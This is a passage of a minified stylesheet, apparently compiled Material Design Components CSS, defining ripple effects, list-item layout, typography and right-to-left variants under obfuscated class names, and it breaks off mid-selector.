.VfPpkd-ksKsZd-XxIAqe::before {
	top: -webkit-calc(50% - 100%);
	top: calc(50% - 100%);
	left: -webkit-calc(50% - 100%);
	left: calc(50% - 100%);
	width: 200%;
	height: 200%
}

.VfPpkd-ksKsZd-XxIAqe::after {
	top: -webkit-calc(50% - 100%);
	top: calc(50% - 100%);
	left: -webkit-calc(50% - 100%);
	left: calc(50% - 100%);
	width: 200%;
	height: 200%
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d::after {
	width: var(--mdc-ripple-fg-size, 100%);
	height: var(--mdc-ripple-fg-size, 100%)
}

.VfPpkd-ksKsZd-XxIAqe[data-mdc-ripple-is-unbounded] {
	overflow: visible
}

.VfPpkd-ksKsZd-XxIAqe[data-mdc-ripple-is-unbounded]::before {
	top: -webkit-calc(50% - 50%);
	top: calc(50% - 50%);
	left: -webkit-calc(50% - 50%);
	left: calc(50% - 50%);
	width: 100%;
	height: 100%
}

.VfPpkd-ksKsZd-XxIAqe[data-mdc-ripple-is-unbounded]::after {
	top: -webkit-calc(50% - 50%);
	top: calc(50% - 50%);
	left: -webkit-calc(50% - 50%);
	left: calc(50% - 50%);
	width: 100%;
	height: 100%
}

.VfPpkd-ksKsZd-XxIAqe[data-mdc-ripple-is-unbounded].VfPpkd-ksKsZd-mWPk3d::before {
	top: var(--mdc-ripple-top, calc(50% - 50%));
	left: var(--mdc-ripple-left, calc(50% - 50%));
	width: var(--mdc-ripple-fg-size, 100%);
	height: var(--mdc-ripple-fg-size, 100%)
}

.VfPpkd-ksKsZd-XxIAqe[data-mdc-ripple-is-unbounded].VfPpkd-ksKsZd-mWPk3d::after {
	top: var(--mdc-ripple-top, calc(50% - 50%));
	left: var(--mdc-ripple-left, calc(50% - 50%));
	width: var(--mdc-ripple-fg-size, 100%);
	height: var(--mdc-ripple-fg-size, 100%)
}

.VfPpkd-rymPhb {
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, sans-serif;
	font-family: var(--mdc-typography-subtitle1-font-family, var(--mdc-typography-font-family, Roboto, sans-serif));
	font-size: 1rem;
	font-size: var(--mdc-typography-subtitle1-font-size, 1rem);
	line-height: 1.75rem;
	line-height: var(--mdc-typography-subtitle1-line-height, 1.75rem);
	font-weight: 400;
	font-weight: var(--mdc-typography-subtitle1-font-weight, 400);
	letter-spacing: .009375em;
	letter-spacing: var(--mdc-typography-subtitle1-letter-spacing, 0.009375em);
	text-decoration: inherit;
	text-decoration: var(--mdc-typography-subtitle1-text-decoration, inherit);
	text-transform: inherit;
	text-transform: var(--mdc-typography-subtitle1-text-transform, inherit);
	line-height: 1.5rem;
	margin: 0;
	padding: 8px 0;
	list-style-type: none;
	color: rgba(0, 0, 0, 0.87);
	color: var(--mdc-theme-text-primary-on-background, rgba(0, 0, 0, 0.87))
}

.VfPpkd-rymPhb:focus {
	outline: none
}

.VfPpkd-rymPhb-ibnC6b {
	height: 48px
}

.VfPpkd-rymPhb-L8ivfd-fmcmS {
	color: rgba(0, 0, 0, 0.54);
	color: var(--mdc-theme-text-secondary-on-background, rgba(0, 0, 0, 0.54))
}

.VfPpkd-rymPhb-f7MjDc {
	background-color: transparent;
	color: rgba(0, 0, 0, 0.38);
	color: var(--mdc-theme-text-icon-on-background, rgba(0, 0, 0, 0.38))
}

.VfPpkd-rymPhb-IhFlZd {
	color: rgba(0, 0, 0, 0.38);
	color: var(--mdc-theme-text-hint-on-background, rgba(0, 0, 0, 0.38))
}

.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-b9t22c {
	opacity: .38;
	color: #000;
	color: var(--mdc-theme-on-surface, #000)
}

.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-fpDzbe-fmcmS,
.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-L8ivfd-fmcmS {
	color: #000;
	color: var(--mdc-theme-on-surface, #000)
}

.VfPpkd-rymPhb-OWXEXe-EzIYc {
	padding-top: 4px;
	padding-bottom: 4px;
	font-size: .812rem
}

.VfPpkd-rymPhb-ibnC6b {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	position: relative;
	-webkit-align-items: center;
	align-items: center;
	-webkit-justify-content: flex-start;
	justify-content: flex-start;
	padding: 0 16px;
	overflow: hidden
}

.VfPpkd-rymPhb-ibnC6b:focus {
	outline: none
}

.VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd,
.VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b,
.VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd .VfPpkd-rymPhb-f7MjDc,
.VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b .VfPpkd-rymPhb-f7MjDc {
	color: #6200ee;
	color: var(--mdc-theme-primary, #6200ee)
}

.VfPpkd-rymPhb-f7MjDc {
	margin-left: 0;
	margin-right: 32px;
	width: 24px;
	height: 24px;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	-webkit-align-items: center;
	align-items: center;
	-webkit-justify-content: center;
	justify-content: center;
	fill: currentColor
}

.VfPpkd-rymPhb-ibnC6b[dir=rtl] .VfPpkd-rymPhb-f7MjDc,
[dir=rtl] .VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-f7MjDc {
	margin-left: 32px;
	margin-right: 0
}

.VfPpkd-rymPhb .VfPpkd-rymPhb-f7MjDc {
	display: -webkit-inline-box;
	display: -webkit-inline-flex;
	display: inline-flex
}

.VfPpkd-rymPhb-IhFlZd {
	margin-left: auto;
	margin-right: 0
}

.VfPpkd-rymPhb-IhFlZd:not(.HzV7m-fuEl3d) {
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, sans-serif;
	font-family: var(--mdc-typography-caption-font-family, var(--mdc-typography-font-family, Roboto, sans-serif));
	font-size: .75rem;
	font-size: var(--mdc-typography-caption-font-size, 0.75rem);
	line-height: 1.25rem;
	line-height: var(--mdc-typography-caption-line-height, 1.25rem);
	font-weight: 400;
	font-weight: var(--mdc-typography-caption-font-weight, 400);
	letter-spacing: .0333333333em;
	letter-spacing: var(--mdc-typography-caption-letter-spacing, 0.0333333333em);
	text-decoration: inherit;
	text-decoration: var(--mdc-typography-caption-text-decoration, inherit);
	text-transform: inherit;
	text-transform: var(--mdc-typography-caption-text-transform, inherit)
}

.VfPpkd-rymPhb-ibnC6b[dir=rtl] .VfPpkd-rymPhb-IhFlZd,
[dir=rtl] .VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-IhFlZd {
	margin-left: 0;
	margin-right: auto
}

.VfPpkd-rymPhb-b9t22c {
	text-overflow: ellipsis;
	white-space: nowrap;
	overflow: hidden
}

.VfPpkd-rymPhb-b9t22c[for] {
	pointer-events: none
}

.VfPpkd-rymPhb-fpDzbe-fmcmS {
	text-overflow: ellipsis;
	white-space: nowrap;
	overflow: hidden;
	display: block;
	margin-top: 0;
	line-height: normal;
	margin-bottom: -20px
}

.VfPpkd-rymPhb-fpDzbe-fmcmS::before {
	display: inline-block;
	width: 0;
	height: 32px;
	content: "";
	vertical-align: 0
}

.VfPpkd-rymPhb-fpDzbe-fmcmS::after {
	display: inline-block;
	width: 0;
	height: 20px;
	content: "";
	vertical-align: -20px
}

.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-fpDzbe-fmcmS {
	display: block;
	margin-top: 0;
	line-height: normal;
	margin-bottom: -20px
}

.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-fpDzbe-fmcmS::before {
	display: inline-block;
	width: 0;
	height: 24px;
	content: "";
	vertical-align: 0
}

.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-fpDzbe-fmcmS::after {
	display: inline-block;
	width: 0;
	height: 20px;
	content: "";
	vertical-align: -20px
}

.VfPpkd-rymPhb-L8ivfd-fmcmS {
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, sans-serif;
	font-family: var(--mdc-typography-body2-font-family, var(--mdc-typography-font-family, Roboto, sans-serif));
	font-size: .875rem;
	font-size: var(--mdc-typography-body2-font-size, 0.875rem);
	line-height: 1.25rem;
	line-height: var(--mdc-typography-body2-line-height, 1.25rem);
	font-weight: 400;
	font-weight: var(--mdc-typography-body2-font-weight, 400);
	letter-spacing: .0178571429em;
	letter-spacing: var(--mdc-typography-body2-letter-spacing, 0.0178571429em);
	text-decoration: inherit;
	text-decoration: var(--mdc-typography-body2-text-decoration, inherit);
	text-transform: inherit;
	text-transform: var(--mdc-typography-body2-text-transform, inherit);
	text-overflow: ellipsis;
	white-space: nowrap;
	overflow: hidden;
	display: block;
	margin-top: 0;
	line-height: normal
}

.VfPpkd-rymPhb-L8ivfd-fmcmS::before {
	display: inline-block;
	width: 0;
	height: 20px;
	content: "";
	vertical-align: 0
}

.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-L8ivfd-fmcmS {
	font-size: inherit
}

.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-ibnC6b {
	height: 40px
}

.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-f7MjDc {
	margin-left: 0;
	margin-right: 36px;
	width: 20px;
	height: 20px
}

.VfPpkd-rymPhb-ibnC6b[dir=rtl] .VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-f7MjDc,
[dir=rtl] .VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-f7MjDc {
	margin-left: 36px;
	margin-right: 0
}

.VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb .VfPpkd-rymPhb-ibnC6b {
	height: 56px
}

.VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb .VfPpkd-rymPhb-f7MjDc {
	margin-left: 0;
	margin-right: 16px;
	width: 40px;
	height: 40px;
	-webkit-border-radius: 50%;
	border-radius: 50%
}

.VfPpkd-rymPhb-ibnC6b[dir=rtl] .VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb .VfPpkd-rymPhb-f7MjDc,
[dir=rtl] .VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb .VfPpkd-rymPhb-f7MjDc {
	margin-left: 16px;
	margin-right: 0
}

.VfPpkd-rymPhb-OWXEXe-aSi1db-RWgCYc .VfPpkd-rymPhb-b9t22c {
	-webkit-align-self: flex-start;
	align-self: flex-start
}

.VfPpkd-rymPhb-OWXEXe-aSi1db-RWgCYc .VfPpkd-rymPhb-ibnC6b {
	height: 72px
}

.VfPpkd-rymPhb-OWXEXe-aSi1db-RWgCYc.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-ibnC6b,
.VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-ibnC6b {
	height: 60px
}

.VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-f7MjDc {
	margin-left: 0;
	margin-right: 20px;
	width: 36px;
	height: 36px
}

.VfPpkd-rymPhb-ibnC6b[dir=rtl] .VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-f7MjDc,
[dir=rtl] .VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-OWXEXe-YLEF4c-rymPhb.VfPpkd-rymPhb-OWXEXe-EzIYc .VfPpkd-rymPhb-f7MjDc {
	margin-left: 20px;
	margin-right: 0
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b {
	cursor: pointer
}

a.VfPpkd-rymPhb-ibnC6b {
	color: inherit;
	text-decoration: none
}

.VfPpkd-rymPhb-clz4Ic {
	height: 0;
	margin: 0;
	border: none;
	border-bottom-width: 1px;
	border-bottom-style: solid;
	border-bottom-color: rgba(0, 0, 0, 0.12)
}

.VfPpkd-rymPhb-clz4Ic-OWXEXe-YbohUe {
	margin-left: 72px;
	margin-right: 0;
	width: -webkit-calc(100% - 72px);
	width: calc(100% - 72px)
}

.VfPpkd-rymPhb-JNdkSc[dir=rtl] .VfPpkd-rymPhb-clz4Ic-OWXEXe-YbohUe,
[dir=rtl] .VfPpkd-rymPhb-JNdkSc .VfPpkd-rymPhb-clz4Ic-OWXEXe-YbohUe {
	margin-left: 0;
	margin-right: 72px
}

.VfPpkd-rymPhb-JNdkSc .VfPpkd-rymPhb {
	padding: 0
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b {
	--mdc-ripple-fg-size: 0;
	--mdc-ripple-left: 0;
	--mdc-ripple-top: 0;
	--mdc-ripple-fg-scale: 1;
	--mdc-ripple-fg-translate-end: 0;
	--mdc-ripple-fg-translate-start: 0;
	-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	will-change: transform, opacity
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::after {
	position: absolute;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	opacity: 0;
	pointer-events: none;
	content: ""
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::before {
	-webkit-transition: opacity 15ms linear, background-color 15ms linear;
	transition: opacity 15ms linear, background-color 15ms linear;
	z-index: 1
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d::before {
	-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
	transform: scale(var(--mdc-ripple-fg-scale, 1))
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d::after {
	top: 0;
	left: 0;
	-webkit-transform: scale(0);
	transform: scale(0);
	-webkit-transform-origin: center center;
	transform-origin: center center
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d-OWXEXe-ZNMTqd::after {
	top: var(--mdc-ripple-top, 0);
	left: var(--mdc-ripple-left, 0)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-lJfZMc::after {
	-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
	animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-OmS1vf::after {
	-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
	animation: mdc-ripple-fg-opacity-out 150ms;
	-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
	transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::after {
	top: -webkit-calc(50% - 100%);
	top: calc(50% - 100%);
	left: -webkit-calc(50% - 100%);
	left: calc(50% - 100%);
	width: 200%;
	height: 200%
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d::after {
	width: var(--mdc-ripple-fg-size, 100%);
	height: var(--mdc-ripple-fg-size, 100%)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b::after {
	background-color: #000
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b:hover::before {
	opacity: .04
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b:not(.VfPpkd-ksKsZd-mWPk3d):focus::before {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .12
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b:not(.VfPpkd-ksKsZd-mWPk3d)::after {
	-webkit-transition: opacity 150ms linear;
	transition: opacity 150ms linear
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b:not(.VfPpkd-ksKsZd-mWPk3d):active::after {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .12
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b.VfPpkd-ksKsZd-mWPk3d {
	--mdc-ripple-fg-opacity: .12
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b::before {
	opacity: .12;
	background-color: #6200ee;
	background-color: var(--mdc-theme-primary, #6200ee)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b::after {
	background-color: #6200ee;
	background-color: var(--mdc-theme-primary, #6200ee)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b:hover::before {
	opacity: .16
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b:not(.VfPpkd-ksKsZd-mWPk3d):focus::before {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .24
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b:not(.VfPpkd-ksKsZd-mWPk3d)::after {
	-webkit-transition: opacity 150ms linear;
	transition: opacity 150ms linear
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b:not(.VfPpkd-ksKsZd-mWPk3d):active::after {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .24
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-pXU01b.VfPpkd-ksKsZd-mWPk3d {
	--mdc-ripple-fg-opacity: .24
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd::before {
	opacity: .08;
	background-color: #6200ee;
	background-color: var(--mdc-theme-primary, #6200ee)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd::after {
	background-color: #6200ee;
	background-color: var(--mdc-theme-primary, #6200ee)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd:hover::before {
	opacity: .12
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd:not(.VfPpkd-ksKsZd-mWPk3d):focus::before {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .2
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd:not(.VfPpkd-ksKsZd-mWPk3d)::after {
	-webkit-transition: opacity 150ms linear;
	transition: opacity 150ms linear
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd:not(.VfPpkd-ksKsZd-mWPk3d):active::after {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .2
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>:not(.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me).VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd.VfPpkd-ksKsZd-mWPk3d {
	--mdc-ripple-fg-opacity: .2
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me {
	--mdc-ripple-fg-size: 0;
	--mdc-ripple-left: 0;
	--mdc-ripple-top: 0;
	--mdc-ripple-fg-scale: 1;
	--mdc-ripple-fg-translate-end: 0;
	--mdc-ripple-fg-translate-start: 0;
	-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	will-change: transform, opacity
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::after {
	position: absolute;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	opacity: 0;
	pointer-events: none;
	content: ""
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::before {
	-webkit-transition: opacity 15ms linear, background-color 15ms linear;
	transition: opacity 15ms linear, background-color 15ms linear;
	z-index: 1
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d::before {
	-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
	transform: scale(var(--mdc-ripple-fg-scale, 1))
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d::after {
	top: 0;
	left: 0;
	-webkit-transform: scale(0);
	transform: scale(0);
	-webkit-transform-origin: center center;
	transform-origin: center center
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d-OWXEXe-ZNMTqd::after {
	top: var(--mdc-ripple-top, 0);
	left: var(--mdc-ripple-left, 0)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-lJfZMc::after {
	-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
	animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-OmS1vf::after {
	-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
	animation: mdc-ripple-fg-opacity-out 150ms;
	-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
	transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::after {
	top: -webkit-calc(50% - 100%);
	top: calc(50% - 100%);
	left: -webkit-calc(50% - 100%);
	left: calc(50% - 100%);
	width: 200%;
	height: 200%
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d::after {
	width: var(--mdc-ripple-fg-size, 100%);
	height: var(--mdc-ripple-fg-size, 100%)
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me::after {
	background-color: #000
}

:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe::before,
:not(.VfPpkd-rymPhb-OWXEXe-tPcied-hXIJHe)>.VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me:not(.VfPpkd-ksKsZd-mWPk3d):focus::before {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .12
}

.r6B9Fd {
	font-family: Roboto, Arial, sans-serif;
	font-size: 1rem;
	font-weight: 400;
	letter-spacing: .00625em;
	line-height: 1.5rem;
	color: #000;
	color: var(--mdc-theme-on-surface, #000)
}

.r6B9Fd .VfPpkd-rymPhb-IhFlZd {
	color: #5f6368
}

.r6B9Fd .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-b9t22c,
.r6B9Fd .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-fpDzbe-fmcmS,
